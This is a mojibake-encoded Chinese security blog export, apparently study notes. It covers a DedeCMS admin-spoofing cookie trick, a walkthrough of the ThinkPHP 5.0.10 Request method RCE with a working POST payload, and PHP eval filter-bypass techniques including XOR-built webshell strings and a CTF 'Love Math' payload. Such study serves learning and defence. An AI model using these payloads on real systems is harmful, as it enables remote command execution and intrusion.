alt="image-20230526134001725"></p><p>è¿˜è®°å¾—ä¸Šé¢çš„å¤„ç†å—ï¼Ÿ</p><p><img src="/../images/image-20230526134147020-1686141975690.png" alt="image-20230526134147020"></p><p>æ‰€ä»¥åªéœ€è¦æ„é€ ä¸€ä¸ªå«æœ‰æ•°å­—1çš„å­—ç¬¦ä¸²å°±å¯ä»¥ä¼ªé€ adminçš„èº«ä»½ã€‚</p><p>æ³¨å†Œä¸€ä¸ªç”¨æˆ·åä¸º1adminçš„ç”¨æˆ·</p><p><img src="/../images/image-20230526125711799-1686141975690.png" alt="image-20230526125711799"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DedeUserID=last_vid=uid</span><br><span class="line">DedeUserID__ckMd5=last_vid__ckMd5</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230526125702071-1686141975690.png" alt="image-20230526125702071"></p><h1 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h1><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">composer create<span class="literal">-project</span> <span class="literal">--prefer-dist</span> topthink/think=<span class="number">5.0</span>.<span class="number">10</span> tp5.<span class="number">0.10</span></span><br></pre></td></tr></table></figure><p>å°† <a href="https://so.csdn.net/so/search?q=composer&spm=1001.2101.3001.7020">composer</a>.json æ–‡ä»¶çš„ require å­—æ®µè®¾ç½®æˆå¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;require&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;php&quot;</span>: <span class="string">&quot;&gt;=5.4.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;topthink/framework&quot;</span>: <span class="string">&quot;5.0.10&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ›´æ–°</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure><p>å°†å…¶æ”¾ç½®åˆ°ç½‘ç«™ç›®å½•ä¸‹ï¼Œè®¿é—®<a href="http://127.0.0.1/tp5.0.10/public/">http://127.0.0.1/tp5.0.10/public/</a></p><p><img src="/../images/image-20230529155309821-1686141975690.png" alt="image-20230529155309821"></p><h2 id="æ¦‚è§ˆ"><a href="#æ¦‚è§ˆ" class="headerlink" title="æ¦‚è§ˆ"></a>æ¦‚è§ˆ</h2><p>æ¨èé˜…è¯»<a href="https://www.cnblogs.com/yokan/p/16102644.html">https://www.cnblogs.com/yokan/p/16102644.html</a></p><h3 id="è·¯ç”±å’Œå‚æ•°ä¼ é€’"><a href="#è·¯ç”±å’Œå‚æ•°ä¼ é€’" class="headerlink" title="è·¯ç”±å’Œå‚æ•°ä¼ é€’"></a>è·¯ç”±å’Œå‚æ•°ä¼ é€’</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//servername/index.php/æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ/[å‚æ•°å/å‚æ•°å€¼...] # pathinfoæ¨¡å¼</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//servername/index.php?s=/index/Index/index    # å…¼å®¹æ–¹å¼</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?name=<span class="number">213</span></span><br><span class="line">/name/<span class="number">123</span></span><br></pre></td></tr></table></figure><p>å¦‚æ§åˆ¶å™¨Indexï¼š<code>application/index/controller/Index.php</code></p><p><img src="/../images/image-20230531232416306.png" alt="image-20230531232416306"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/tp5.0.10/public/index.php/index/Index/hello?name=world</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/tp5.0.10/public/index.php/index/Index/hello/name/world</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/tp5.0.10/public/index.php?s=/index/Index/hello/name/world</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/tp5.0.10/public/index.php?s=/index/Index/hello&amp;name=world</span></span><br></pre></td></tr></table></figure><h2 id="Requestç±»ä»»æ„è°ƒç”¨-constructæ–¹æ³•å¯¼è‡´çš„rce"><a href="#Requestç±»ä»»æ„è°ƒç”¨-constructæ–¹æ³•å¯¼è‡´çš„rce" class="headerlink" title="Requestç±»ä»»æ„è°ƒç”¨__constructæ–¹æ³•å¯¼è‡´çš„rce"></a>Requestç±»ä»»æ„è°ƒç”¨__constructæ–¹æ³•å¯¼è‡´çš„rce</h2><h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>Requestæ ¸å¿ƒç±»**$method** æ¥è‡ªå¯æ§çš„ <strong>$_POST</strong> æ•°ç»„ï¼Œè€Œä¸”åœ¨è·å–ä¹‹åæ²¡æœ‰è¿›è¡Œä»»ä½•æ£€æŸ¥ï¼Œç›´æ¥æŠŠå®ƒä½œä¸º <strong>Request</strong> ç±»çš„æ–¹æ³•è¿›è¡Œè°ƒç”¨ï¼ŒåŒæ—¶ï¼Œè¯¥æ–¹æ³•ä¼ å…¥çš„å‚æ•°æ˜¯å¯æ§æ•°æ® <strong>$_POST</strong> ã€‚å¯¼è‡´å¯ä»¥éšæ„è°ƒç”¨ <strong>Request</strong> ç±»çš„éƒ¨åˆ†æ–¹æ³•</p><blockquote><p><strong>è¿‡ç¨‹ï¼š</strong></p><p>è®©methodç­‰äº <code>__construct</code>é­”æœ¯æ–¹æ³•ï¼Œç„¶åé‡Œé¢çš„ <code>foreach</code>å‡½æ•°é€ æˆå˜é‡è¦†ç›–ã€‚ç„¶åé€šè¿‡<strong>Request</strong> ç±»ä¸­çš„ <code>param</code>æ–¹æ³•æœ€ç»ˆåˆè°ƒç”¨äº†<code>filterValue</code>æ–¹æ³•ï¼Œè€Œè¯¥æ–¹æ³•ä¸­å°±å­˜åœ¨å¯åˆ©ç”¨çš„ <strong>call_user_func</strong> å‡½æ•°ï¼Œä»è€Œæ‰§è¡Œä»»æ„å‘½ä»¤</p></blockquote><blockquote><p><strong>Request</strong> ç±»ä¸­çš„ <code>paramã€routeã€getã€postã€putã€deleteã€patchã€requestã€sessionã€serverã€envã€cookieã€input</code> æ–¹æ³•å‡è°ƒç”¨äº† <strong>filterValue</strong> æ–¹æ³•ï¼Œè€Œè¯¥æ–¹æ³•ä¸­å°±å­˜åœ¨å¯åˆ©ç”¨çš„ <strong>call_user_func</strong> å‡½æ•°</p></blockquote><p>ä»¥5.0.10ç‰ˆæœ¬ä¸ºä¾‹</p><p>payload</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/tp5.0.10/public/index.php</span><br><span class="line"></span><br><span class="line"># post</span><br><span class="line">_method=__construct&amp;filter=system&amp;cmd=whoami</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230531225820851.png" alt="image-20230531225820851"></p><h3 id="è°ƒè¯•-1"><a href="#è°ƒè¯•-1" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><p>ç¬¬ä¸€ä¸ªæ–­ç‚¹ä¸‹åœ¨<code>thinkphp/libary/think/App.php</code>æ–‡ä»¶ï¼Œè°ƒç”¨<code>routeCheck</code>è¿›è¡Œè°ƒåº¦è§£æè¿™é‡Œ</p><p><img src="/../images/image-20230531221156861.png" alt="image-20230531221156861"></p><p>è·Ÿè¿›<code>routeCheck</code></p><p><img src="/../images/image-20230531221218359.png" alt="image-20230531221218359"></p><p>è·Ÿè¿›<code>check</code></p><p><img src="/../images/image-20230531221233596.png" alt="image-20230531221233596"></p><p>è·Ÿè¿›<code>method</code></p><p><img src="/../images/image-20230531221259178.png" alt="image-20230531221259178"></p><p><code>var_method</code>åœ¨<code>application/config.php</code>ä¸­</p><p><img src="/../images/image-20230531222320838.png" alt="image-20230531222320838"></p><p>æ‰€ä»¥è¿™é‡Œå¯ä»¥æ§åˆ¶<code>method</code>å˜é‡ï¼Œä»è€Œä»»æ„è°ƒç”¨Requestç±»çš„æ–¹æ³•ã€‚</p><p>å¦‚æœè°ƒç”¨<code>__construct</code>æ–¹æ³•</p><p><img src="/../images/image-20230531221707200.png" alt="image-20230531221707200"></p><p>å­˜åœ¨ä¸€ä¸ª<code>foreach</code>å¾ªç¯ï¼Œå¦‚æœä¼ å…¥çš„<code>options</code>æ•°ç»„çš„é”®åä¸ºè¯¥ç±»çš„å±æ€§ï¼Œå°±ç”¨é”®å€¼è¦†ç›–è¯¥å±æ€§çš„å€¼ã€‚</p><p><img src="/../images/image-20230531222852250.png" alt="image-20230531222852250"></p><p>ç»§ç»­å¾€ä¸‹</p><p>åœ¨<code>App::run()</code>æ–¹æ³•é‡Œé¢ï¼Œå¦‚æœæˆ‘ä»¬å¼€å¯äº†debugæ¨¡å¼ï¼Œåˆ™ä¼šè°ƒç”¨<code>Request::param()</code>æ–¹æ³•ï¼š</p><p><img src="/../images/image-20230531223011915.png" alt="image-20230531223011915"></p><p>å°±ç®—æ²¡æœ‰å¼€å¯debugæ¨¡å¼ï¼Œä¸‹é¢çš„execæ–¹æ³•ä¹Ÿä¼šè°ƒç”¨</p><p><img src="/../images/image-20230531230604547.png" alt="image-20230531230604547"></p><p><img src="/../images/image-20230531220640414.png" alt="image-20230531220640414"></p><p>è·Ÿè¿›<code>Request::param()</code>æ–¹æ³•</p><p>å°†è·å–åˆ°çš„postå‚æ•°ç”¨<code>array_merge</code>ä¸getæ–¹å¼çš„å‚æ•°è¿›è¡Œåˆå¹¶</p><p><img src="/../images/image-20230531225110758.png" alt="image-20230531225110758"></p><p>æœ€åå°†å…¶ä¼ å…¥<code>input</code>ä¸­</p><p><img src="/../images/image-20230531224212939.png" alt="image-20230531224212939"></p><p>è·Ÿè¿›<code>Request::input()</code>,<code>array_walk_recursive</code>  å¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªæˆå‘˜é€’å½’åœ°åº”ç”¨ç”¨æˆ·å‡½æ•°</p><p><img src="/../images/image-20230531224435122.png" alt="image-20230531224435122"></p><p>ç„¶å<code>filterValue</code>æ–¹æ³•ä¸­ï¼Œè°ƒç”¨äº†<code>call_user_func</code>é€ æˆä»»æ„å‘½ä»¤æ‰§è¡Œ</p><p><img src="/../images/image-20230531223158698.png" alt="image-20230531223158698"></p><h3 id="å…³é”®ç‚¹æ€»ç»“"><a href="#å…³é”®ç‚¹æ€»ç»“" class="headerlink" title="å…³é”®ç‚¹æ€»ç»“"></a>å…³é”®ç‚¹æ€»ç»“</h3><p>Fromï¼šä¸ƒæœˆç«å¸ˆå‚…çš„ä¸€å¼ æµç¨‹å›¾</p><p><img src="/../images/1964477-20220405155310200-1040131440.png" alt="img"></p><h3 id="å…¶ä»–ç‰ˆæœ¬"><a href="#å…¶ä»–ç‰ˆæœ¬" class="headerlink" title="å…¶ä»–ç‰ˆæœ¬"></a>å…¶ä»–ç‰ˆæœ¬</h3><p>æµç¨‹å¤§åŒå°å¼‚</p><p>payloadæ€»ç»“ï¼š<a href="https://y4er.com/posts/thinkphp5-rce/#thinkphp5-method%E4%BB%BB%E6%84%8F%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95%E5%AF%BC%E8%87%B4rce">https://y4er.com/posts/thinkphp5-rce/#thinkphp5-method%E4%BB%BB%E6%84%8F%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95%E5%AF%BC%E8%87%B4rce</a></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHPä»£ç æ‰§è¡Œç»•è¿‡</title>
      <link href="/2023/05/31/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/"/>
      <url>/2023/05/31/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="ç»•è¿‡é•¿åº¦"><a href="#ç»•è¿‡é•¿åº¦" class="headerlink" title="ç»•è¿‡é•¿åº¦"></a>ç»•è¿‡é•¿åº¦</h2><p><a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html">https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="variable">$get</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$get</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;This is too long.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$get</span>);</span><br><span class="line">          &#125; </span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>å‘½ä»¤æ‰§è¡Œç»•è¿‡</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get=`<span class="variable">$_GET</span>[<span class="number">1</span>]`;&amp;<span class="number">1</span>=bash</span><br></pre></td></tr></table></figure></li><li><p>è¿œç¨‹æ–‡ä»¶åŒ…å«</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>];</span><br></pre></td></tr></table></figure></li><li><p>æœ¬åœ°æ–‡ä»¶åŒ…å«</p><ul><li>file_put_contents</li><li>æ—¥å¿—æ–‡ä»¶åŒ…å«</li></ul></li><li><p>åˆ©ç”¨å˜é•¿å‚æ•°ç‰¹æ€§å±•å¼€æ•°ç»„â€“<strong>php 5.6</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET:<span class="number">1</span>[]=test&amp;<span class="number">1</span>[]=<span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>);&amp;<span class="number">2</span>=assert</span><br><span class="line">POST:param=<span class="title function_ invoke__">usort</span>(...<span class="variable">$_GET</span>);</span><br></pre></td></tr></table></figure></li></ul><h2 id="ç»•è¿‡å‰ç½®æ··æ·†å­—ç¬¦"><a href="#ç»•è¿‡å‰ç½®æ··æ·†å­—ç¬¦" class="headerlink" title="ç»•è¿‡å‰ç½®æ··æ·†å­—ç¬¦"></a>ç»•è¿‡å‰ç½®æ··æ·†å­—ç¬¦</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">str = ä»»æ„å­—ç¬¦ä¸²</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol><li><p>é—­åˆphpæ ‡ç­¾</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cmd=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> payload; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>æ¢è¡Œç»•è¿‡</p><ul><li>%0a</li><li>\n</li><li>\r</li></ul></li></ol><h2 id="ç»•è¿‡å­—ç¬¦ç§ç±»æ•°é‡"><a href="#ç»•è¿‡å­—ç¬¦ç§ç±»æ•°é‡" class="headerlink" title="ç»•è¿‡å­—ç¬¦ç§ç±»æ•°é‡"></a>ç»•è¿‡å­—ç¬¦ç§ç±»æ•°é‡</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result2 = [<span class="number">0x8b</span>, <span class="number">0x9b</span>, <span class="number">0xa0</span>, <span class="number">0x9c</span>, <span class="number">0x8f</span>, <span class="number">0x91</span>, <span class="number">0x9e</span>, <span class="number">0xd1</span>, <span class="number">0x96</span>, <span class="number">0x8d</span>, <span class="number">0x8c</span>] </span><br><span class="line">result = [<span class="number">0x9b</span>, <span class="number">0xa0</span>, <span class="number">0x9c</span>, <span class="number">0x8f</span>, <span class="number">0x9e</span>, <span class="number">0xd1</span>, <span class="number">0x96</span>, <span class="number">0x8c</span>]  <span class="comment"># to be deleted</span></span><br><span class="line">temp = <span class="built_in">set</span>()</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> result2:</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> result:</span><br><span class="line">                <span class="keyword">if</span> (a ^ b ^ c == d):</span><br><span class="line">                    <span class="keyword">if</span> a == b == c == d:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot;</span> % (a, b, c, d))</span><br><span class="line">                        temp.add(<span class="built_in">hex</span>(d))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(temp), temp)</span><br></pre></td></tr></table></figure><blockquote><p>result2ä¸­çš„å­—ç¬¦ç”¨resultä¸­çš„å­—ç¬¦ä»£æ›¿ï¼Œd&#x3D;a^b^c^d,è¿™æ ·å°±å‡å°‘äº†ä¸€ç§å­—ç¬¦ç§ç±»</p></blockquote><h2 id="çˆ†ç ´å¯ç”¨å­—ç¬¦-x2F-å¯ç”¨å‡½æ•°"><a href="#çˆ†ç ´å¯ç”¨å­—ç¬¦-x2F-å¯ç”¨å‡½æ•°" class="headerlink" title="çˆ†ç ´å¯ç”¨å­—ç¬¦&#x2F;å¯ç”¨å‡½æ•°"></a>çˆ†ç ´å¯ç”¨å­—ç¬¦&#x2F;å¯ç”¨å‡½æ•°</h2><blockquote><p>åœ¨æµè§ˆå™¨ä¸­æŸ¥çœ‹ç»“æœ</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$preg</span> =<span class="string">&#x27;/\&#x27;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&#x27;</span>;</span><br><span class="line">å¯ç”¨å­—ç¬¦</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$a</span>=<span class="number">0</span>;<span class="variable">$a</span>&lt;<span class="number">128</span>;<span class="variable">$a</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span>, <span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>).<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#å¯ç”¨å‡½æ•°</span></span><br><span class="line"><span class="comment">#è·å–å†…ç½®å‡½æ•° </span></span><br><span class="line"><span class="variable">$arr</span> = <span class="title function_ invoke__">get_defined_functions</span>()[<span class="string">&#x27;internal&#x27;</span>];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span>, <span class="variable">$value</span>) )&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$arr</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$arr</span>);</span><br></pre></td></tr></table></figure><h2 id="æ•°å­¦å‡½æ•°æ„é€ payload"><a href="#æ•°å­¦å‡½æ•°æ„é€ payload" class="headerlink" title="æ•°å­¦å‡½æ•°æ„é€ payload"></a>æ•°å­¦å‡½æ•°æ„é€ payload</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">hex2bin</span>(<span class="string">&#x27;706870696e666f&#x27;</span>) â†’phpinfo</span><br><span class="line"><span class="title function_ invoke__">hex2bin</span>(<span class="string">&#x27;73797374656d&#x27;</span>)  â†’ system  </span><br></pre></td></tr></table></figure><h4 id="CISCN-2019-åˆèµ›-Love-Math"><a href="#CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="[CISCN 2019 åˆèµ›]Love Math"></a>[CISCN 2019 åˆèµ›]Love Math</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$content</span>=<span class="title function_ invoke__">system</span>(cat /flag)</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">é»‘åå•ï¼šç©ºæ ¼,\t,\r,\n,<span class="string">&#x27;&#x27;</span>,<span class="string">&quot;&quot;</span>,[]</span><br><span class="line">    </span><br><span class="line">æ­£åˆ™åŒ¹é…è¡¨è¾¾å¼ï¼š/[a-zA-Z_\x7f-\xff][a-zA-Z_0-<span class="number">9</span>\x7f-\xff]*/</span><br><span class="line">æ­£åˆ™åŒ¹é…åˆ°çš„éƒ¨åˆ†è¿›è¡Œç™½åå•è¿‡æ»¤    </span><br><span class="line">ç™½åå•ï¼šåªèƒ½ä½¿ç”¨æ•°å­¦å‡½æ•°  </span><br><span class="line"></span><br><span class="line">è¿™é‡Œåˆ©ç”¨phpçš„åŠ¨æ€å‡½æ•°</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(cat /flag);</span><br><span class="line">ç­‰ä»·ä¸<span class="title function_ invoke__">system</span>(cat /flag)</span><br><span class="line">æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ„é€ <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]=system <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]=cat /flag  <span class="variable">$a</span>(<span class="variable">$b</span>)</span><br><span class="line"></span><br><span class="line">éœ€è¦æˆ‘ä»¬æ„é€ çš„æ˜¯_GETå’Œ[]ï¼Œ[]å¯ä»¥ç”¨&#123;&#125;æ›¿ä»£ï¼Œ_GETç”¨<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">dechex</span>(_GETå¯¹åº”çš„åè¿›åˆ¶))</span><br><span class="line">å› ä¸ºæœ‰æ­£åˆ™ï¼Œæ‰€ä»¥åªèƒ½ç”¨ä¸å«æœ‰å­—æ¯çš„è¿›åˆ¶å¦‚<span class="number">10</span>è¿›åˆ¶æˆ–è€…<span class="number">8</span>è¿›åˆ¶ï¼Œæ‰€ä»¥éœ€è¦ç”¨dechexå°†<span class="number">10</span>è¿›åˆ¶è½¬ä¸º<span class="number">16</span>è¿›åˆ¶</span><br><span class="line">hex2binä¹Ÿä¸èƒ½å‡ºç°ï¼Œç”¨<span class="title function_ invoke__">base_convert</span>()æ¥ç”Ÿæˆï¼š</span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)</span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">432335067717</span>,<span class="number">8</span>,<span class="number">36</span>)</span><br><span class="line"> </span><br><span class="line">å°†_GETä¿å­˜åœ¨å˜é‡ä¸­ï¼ˆä¸ºäº†ä¿è¯é•¿åº¦å°äº<span class="number">80</span>ï¼‰</span><br><span class="line"><span class="variable">$pi</span>=<span class="variable">$base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(_GETå¯¹åº”çš„åè¿›åˆ¶))â†’_GET</span><br><span class="line"><span class="variable">$$pi</span>&#123;pi&#125;â†’<span class="variable">$_GET</span>[pi]</span><br><span class="line"><span class="variable">$$pi</span>&#123;abs&#125;â†’<span class="variable">$_GET</span>[abs]</span><br><span class="line"></span><br><span class="line">æœ€ç»ˆpayloadï¼š</span><br><span class="line">?c=<span class="variable">$pi</span>=<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));<span class="variable">$$pi</span>&#123;pi&#125;(<span class="variable">$$pi</span>&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag    </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220626151220775-1687682103386.png" alt="image-20220626151220775"></p><p><img src="/../images/image-20220626151314181-1687682103387.png" alt="image-20220626151314181"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸ç›´æ¥ç”¨hex2bin(dechex(system cat /flagå¯¹åº”çš„åè¿›åˆ¶))æ˜¯å› ä¸ºæ•°å€¼è¶…è¿‡dechexçš„å¤„ç†èŒƒå›´ï¼Œè¿”å›ä¸º0</span><br></pre></td></tr></table></figure><h2 id="æ— å­—æ¯æ•°å­—å’Œä¸€äº›ç¬¦å·"><a href="#æ— å­—æ¯æ•°å­—å’Œä¸€äº›ç¬¦å·" class="headerlink" title="æ— å­—æ¯æ•°å­—å’Œä¸€äº›ç¬¦å·"></a>æ— å­—æ¯æ•°å­—å’Œä¸€äº›ç¬¦å·</h2><p><a href="https://www.hetianlab.com/specialized/20201124173456">https://www.hetianlab.com/specialized/20201124173456</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="åˆ©ç”¨ç©ºå­—ç¬¦-è¿ç®—æ„é€ "><a href="#åˆ©ç”¨ç©ºå­—ç¬¦-è¿ç®—æ„é€ " class="headerlink" title="åˆ©ç”¨ç©ºå­—ç¬¦^è¿ç®—æ„é€ "></a>åˆ©ç”¨ç©ºå­—ç¬¦^è¿ç®—æ„é€ </h4><ul><li><p>å•ä¸ªå­—ç¬¦</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">127</span>;<span class="variable">$i</span>&lt;<span class="number">255</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">127</span>;<span class="variable">$j</span>&lt;<span class="number">255</span>;<span class="variable">$j</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%s^%s&quot;</span>,<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)),<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$j</span>))).<span class="string">&quot;=&gt;&quot;</span>. (<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)^<span class="title function_ invoke__">chr</span>(<span class="variable">$j</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">%<span class="number">8</span>C^%FF=&gt;s</span><br></pre></td></tr></table></figure><blockquote><p>((%FE^%AE).(%FE^%96).(%FE^%AE).(%FE^%97).(%FE^%90).(%FE^%98).(%FD^%92))(); â†’phpinfo();</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%12&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%14&#x27;</span>^<span class="string">&#x27;`&#x27;</span>); <span class="comment">// $_=&#x27;assert&#x27;;</span></span><br><span class="line"><span 